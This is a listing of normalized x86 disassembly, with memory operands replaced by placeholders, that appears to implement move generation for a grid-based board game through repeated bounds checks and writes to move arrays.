mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0x6
jg r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ rw-data ]
mov [ rw-data ] 0x1
jmp r-xdata
mov esi [ ebp + 0xc ]
inc edx
add ecx 0x4
mov [ rw-data ] edx
cmp edx [ esi + 0x4 ]
mov esi [ ebp + 0x18 ]
jl r-xdata
mov ecx [ rw-data ]
inc ecx
mov [ rw-data ] ecx
cmp ecx 0x6
jg r-xdata
mov ecx [ rw-data ]
mov edi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp + 0xc ]
inc edx
add ecx 0x4
mov [ rw-data ] edx
cmp edx [ eax + 0x4 ]
mov eax [ ebp + 0x1c ]
jl r-xdata
mov ecx [ ebp - 0x8 ]
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp edx 0x4
jl r-xdata
cmp ecx 0xa
jg r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x4 ]
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp edx 0x4
jl r-xdata
cmp ecx 0x3
jg r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ ebp - 0x8 ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
cmp ecx 0x1
jl r-xdata
cmp [ ebp - 0x4 ] 0xa
jg r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x2 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ esi + ecx * 4 + 0x34 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov edx [ ebp - 0x8 ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
cmp ecx 0x1
jl r-xdata
cmp [ ebp - 0x4 ] 0x5
jg r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x2 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ esi + ecx * 4 + 0x34 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov edx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
add ecx [ ebp - 0x4 ]
cmp [ esi + ecx * 4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
add edx 0x2
inc ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x1 ]
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x1
jl r-xdata
cmp [ rw-data ] 0xa
jg r-xdata
mov ecx [ rw-data ]
cmp [ rw-data ] 0x1
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ edx - 0x1 ]
mov [ rw-data ] ecx
add ecx [ ebp - 0x4 ]
cmp [ esi + ecx * 4 ] 0x20
mov esi [ ebp + 0x18 ]
jne r-xdata
mov ecx [ rw-data ]
add edx 0x2
inc ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov [ rw-data ] ecx
lea edi [ edx - 0x1 ]
mov [ rw-data ] edi
mov edi [ ebp + 0x10 ]
cmp ecx 0x1
jl r-xdata
cmp [ rw-data ] 0xa
jg r-xdata
mov ecx [ rw-data ]
cmp [ rw-data ] 0x1
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov edx [ rw-data ]
lea edx [ edx + edx * 2 ]
shl edx 0x2
mov [ ebp - 0xc ] edx
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
inc edi
add ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x9
jle r-xdata
mov edi [ rw-data ]
dec edi
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov edx [ rw-data ]
lea edx [ edx + edx * 2 ]
shl edx 0x2
mov [ ebp - 0xc ] edx
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
nop [ eax ] eax
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
inc edi
add ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x9
jle r-xdata
mov edi [ rw-data ]
xor edx edx
dec edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
inc edi
add ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x9
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edi [ rw-data ]
xor edx edx
dec edi
mov [ rw-data ] edx
mov [ rw-data ] edi
cmp edi 0x1
jl r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
inc edi
add ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x9
jle r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ecx
cmp ecx 0x4
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x0
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp [ ecx ] 0x20
jne r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] ecx
cmp ecx 0x4
jl r-xdata
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] 0x10
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp [ ecx ] 0x20
jne r-xdata
cmp ecx 0x8
jl r-xdata
mov edi [ ebp - 0x4 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x8 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp ecx 0x1
jl r-xdata
mov edi [ ebp - 0x8 ]
lea ecx [ edx + edx * 2 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x8 ]
lea ecx [ edi + ecx * 4 ]
mov edi [ ebp + 0x10 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov edx [ rw-data ]
cmp edx 0x6
jl r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x2 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ eax + ecx * 4 + 0x2c ] 0x20
mov eax [ ebp + 0x1c ]
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
cmp edx 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x2 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ edx + ecx * 4 ]
cmp [ eax + ecx * 4 + 0x2c ] 0x20
mov eax [ ebp + 0x1c ]
jne r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ ebp - 0x4 ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
add edx 0xfffffffe
inc ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp edx 0xa
jg r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
add edx 0xfffffffe
inc ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x9
jg r-xdata
mov ecx [ rw-data ]
dec ecx
mov [ rw-data ] edx
mov [ rw-data ] ecx
cmp ecx 0x1
jl r-xdata
cmp edx 0xa
jg r-xdata
cmp [ rw-data ] 0x1
jl r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + 0x1 ]
add ecx edx
lea ecx [ eax + ecx * 4 ]
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 - 0x1 ]
add ecx edx
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ rw-data ]
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
inc [ eax ]
cmp [ edi ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ rw-data ]
lea edx [ ecx + ecx * 2 ]
shl edx 0x2
mov [ ebp - 0xc ] edx
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
dec edi
sub ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov edx [ rw-data ]
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
lea edx [ ecx + ecx * 2 ]
shl edx 0x2
mov [ ebp - 0xc ] edx
lea ecx [ edx + edi ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
add ecx edi
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x1
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edx
xor edx edx
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edi
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0xc ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ ebp - 0x8 ]
dec edi
sub ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov edx [ rw-data ]
cmp [ ecx ] 0x20
jne r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov esi [ ebp + 0x8 ]
lea ecx [ ecx + ecx * 2 ]
shl ecx 0x2
mov [ ebp - 0xc ] ecx
add ecx edi
lea ecx [ esi + ecx * 4 ]
mov esi [ ebp + 0x18 ]
mov [ ebp - 0x8 ] ecx
nop [ eax + eax ] eax
test edx edx
jne r-xdata
test edx edx
jne r-xdata
mov edx [ rw-data ]
lea ecx [ edi + edi * 2 ]
lea ecx [ edx + ecx * 4 ]
mov edx [ ebp + 0x8 ]
lea ecx [ edx + ecx * 4 ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
cmp [ ecx * 4 + r--data ] 0x0
je r-xdata
mov edx 0x1
mov [ rw-data ] edx
dec edi
sub ecx 0x30
mov [ rw-data ] edi
mov [ ebp - 0x8 ] ecx
cmp edi 0x1
jge r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
xor edx edx
mov ecx [ ebp + 0x10 ]
inc [ eax ]
cmp [ ecx ] edx
mov ecx [ ebp - 0x8 ]
sete dl
mov ecx [ ecx ]
cmp ecx [ edx * 4 + r--data ]
je r-xdata
mov ecx [ eax ]
mov edx [ ebp + 0x14 ]
mov [ edx + ecx * 4 ] ebx
mov ecx [ eax ]
mov edx [ rw-data ]
mov [ esi + ecx * 8 ] edi
mov ecx [ eax ]
mov [ esi + ecx * 8 + 0x4 ] edx
